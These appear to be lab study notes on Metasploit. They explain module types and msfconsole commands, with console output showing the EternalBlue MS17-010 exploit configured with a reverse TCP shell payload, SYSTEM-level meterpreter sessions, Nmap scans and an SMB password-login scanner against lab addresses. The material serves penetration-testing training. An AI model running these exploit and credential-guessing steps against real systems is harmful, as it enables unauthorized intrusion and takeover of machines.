# Metasploit
<p align="center">
<img src="https://user-images.githubusercontent.com/73976100/222862293-3c5403ac-f7f7-4385-8a15-4d274a885d41.png" width="300">
</p>

### Main Componets of Metasploit  
`msfconsole`  
- Exploit: A piece of code that uses a vulnerability present on the target system.
- Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
- Payload: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.  
<br>

`/metasploit-framework/modules`  
- Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.  
- Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
- Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.
- Exploits: Exploits, neatly organized by target system.
- NOPs: NOPs (No OPeration) do nothing, literally.
- Payloads: Payloads are codes that will run on the target system.
    - Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
    - Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
    - Stages: Downloaded by the stager. This will allow you to use larger sized payloads.
- Post: Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.  

### Msfconsole

`use`  
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```  
`show options`: show context set  
`show payloads`: show  list available modules in the context
`back`: leave the context  
`info`: information in the context (`info exploit/windows/smb/ms17_010_eternalblue`)  
<br>  

`search`  
```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-
```  
You can use any module returned in a search result with the command use followed by the number at the beginning of the result line. (e.g. `use 0` instead of `use auxiliary/admin/smb/ms17_010_command`)  

<img src="https://user-images.githubusercontent.com/73976100/222870889-cbb16361-7699-4ef4-be9b-bbef1479dd61.png" width="800">  

You can direct the search function using keywords such as type and platform.  
`search type:auxiliary telnet`  
`search rank:excellent telnet`  
<br>  

`set PARAMETER_NAME VALUE`: All parameters are set using the same command  

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
rhosts => 10.10.165.39
```  

Parameters:  
- RHOSTS: “Remote host”, the IP address of the target system. A single IP address or a network range can be set. CIDR (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y) support.  list support. file:/path/of/the/target_file.txt  
    <img src="https://user-images.githubusercontent.com/73976100/222873145-dcde2b37-2cdb-43a2-8757-ee2bc80c5e43.png" width="600">  
- RPORT: “Remote port”, the port on the target system the vulnerable application is running on.
- PAYLOAD: The payload you will use with the exploit.
- LHOST: “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.
- LPORT: “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
- SESSION: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.  

`unset`: clear any parameters  
```
msf5 exploit(windows/smb/ms17_010_eternalblue) > unset all
Flushing datastore...
```  

`setg` and `unsetg`: set (unset) values that will be used for all modules  

#### Using modules  
`exploit`: launch the module  
`run`: alias created for the `exploit` command as the word exploit did not make sense when using modules that were not exploits (port scanners, vulnerability scanners, etc.)  
`-z`: background the session as soon as it opens  
`-check`: check if the target system is vulnerable without exploiting it  

#### Sessions
`background`: background the session prompt and go back to the msfconsole prompt  
```
meterpreter > background
[*] Backgrounding session 2...
msf5 exploit(windows/smb/ms17_010_eternalblue) > 
```  
`sessions`: To see the existing sessions  
`-i`: To interact with any session  
```
msf5 > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf5 > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```  

## Exploitation  
### Scanning  
#### Port Scanning  
`search porscan`  
You can directly perform Nmap scans from the msfconsole prompt as shown below faster:  
```
msf6 > nmap -sS 10.10.12.229
[*] exec: nmap -sS 10.10.12.229


Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-20 03:54 BST
```  

#### UDP service Identification  
`scanner/discovery/udp_sweep`: provide a quick way to identify services such as DNS or NetBIOS  

#### SMB Scans  
Especially useful in a corporate network would be `smb_enumshares` and `smb_version` but please spend some time to identify scanners that the Metasploit version installed on your system offers.  
When performing service scans, it would be important not to omit more "exotic" services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers.   
`scanner/smb/smb_login`: scan user's SMB password  

### The Metasploit Database
Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.   
`systemctl start postgresql`  
`msfdb init`
```
root@attackbox:~# systemctl start postgresql 
root@attackbox:~# msfdb init
[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/connection_adapters/abstract_adapter.rb:84: warning: deprecated Object#=~ is called on Integer; it always returns nil
```  
`db_status`: check the database status  
`workspace`: create workspaces  
`-a`: add a workspace, `-d`: delete a workspace  
```
msf6 > workspace -a tryhackme
[*] Added workspace: tryhackme
[*] Workspace: tryhackme
msf5 > workspace
default
* tryhackme
msf6 >
```  
`workspace -h`  
`help`: show the Database Backends Commands menu  
If you run a Nmap scan using the `db_nmap` shown below, all results will be saved to the database.   
```
msf6 > db_nmap -sV -p- 10.10.12.229
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-20 03:15 UTC
```  
You can now reach information relevant to hosts and services running on target systems with the `hosts` and `services` commands, respectively.   
```
msf6 > hosts
Hosts
=====

address       mac                name                                        os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----                                        -------  ---------  -----  -------  ----  --------
10.10.12.229  02:ce:59:27:c8:e3  ip-10-10-12-229.eu-west-1.compute.internal  Unknown                    device         

msf6 > services
Services
========

host          port   proto  name               state  info
----          ----   -----  ----               -----  ----
10.10.12.229  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.12.229  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.12.229  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
```  
Once the host information is stored in the database, you can use the `hosts -R` command to add this value to the RHOSTS parameter.   
<br>  

In a typical penetration testing engagement, we could have the following scenario:  
1. Finding available hosts using the `db_nmap` command
2. Scanning these for further vulnerabilities or open ports (using a port scanning module) 
<br>  

Example Workflow
1. We will use the vulnerability scanning module that finds potential MS17-010 vulnerabilities with the `use auxiliary/scanner/smb/smb_ms17_010` command.
2. We set the RHOSTS value using `hosts -R`.
3. We have typed `show options` to check if all values were assigned correctly.
4. Once all parameters are set, we launch the exploit using the `run` or `exploit` command.  

The services command used with the `-S` parameter will allow you to search for specific services in the environment.  
```
msf6 > services -S netbios                
Services                          
========                           
host          port  proto  name         state  info                                                                              
----          ----  -----  ----         -----  ----                                                                              
10.10.12.229  139   tcp    netbios-ssn  open   Microsoft Windows netbios-ssn
```  
Low-hanging fruits:  
|Query|description|
|:----:|----------|
|HTTP|Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE). |
|FTP|Could allow anonymous login and provide access to interesting files. |
|SMB|Could be vulnerable to SMB exploits like MS17-010|
|SSH|Could have default or easy to guess credentials|
|RDP|Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. |  

### Exploit
`show payloads` command to list other commands you can use with that specific exploit.  
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads 

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
```  
Once you have decided on the payload, you can use the `set payload` command to make your choice.  
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 2
payload => generic/shell_reverse_tcp
```











